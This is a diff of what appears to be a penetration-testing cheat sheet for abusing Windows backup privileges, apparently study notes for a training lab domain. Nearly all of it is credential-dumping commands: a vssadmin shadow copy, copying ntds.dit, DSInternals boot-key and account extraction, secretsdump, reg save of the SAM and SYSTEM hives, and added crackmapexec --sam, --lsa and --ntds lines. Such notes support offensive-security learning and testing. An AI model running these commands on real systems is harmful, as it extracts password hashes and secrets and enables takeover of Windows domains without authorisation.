@@ -82,15 +82,19 @@ vssadmin create shadow /for=C:
 # Copying NTDS.dit
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 
-reg save HKLM\SYSTEM SYSTEM.SAV
-reg save HKLM\SAM SAM.SAV
-
 Import-Module .\DSInternals.psd1
 $key = Get-BootKey -SystemHivePath .\SYSTEM
 Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
 
 # Secretsdump
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+
+crackmapexec smb <IP> -u admin -p pass --sam
+crackmapexec smb <IP> -u admin -p pass --lsa
+crackmapexec smb <IP> -u admin -p pass --ntds
+
+reg save HKLM\SYSTEM SYSTEM.SAV
+reg save HKLM\SAM SAM.SAV
 ```
 
 # SeEnableDelegationPrivilege
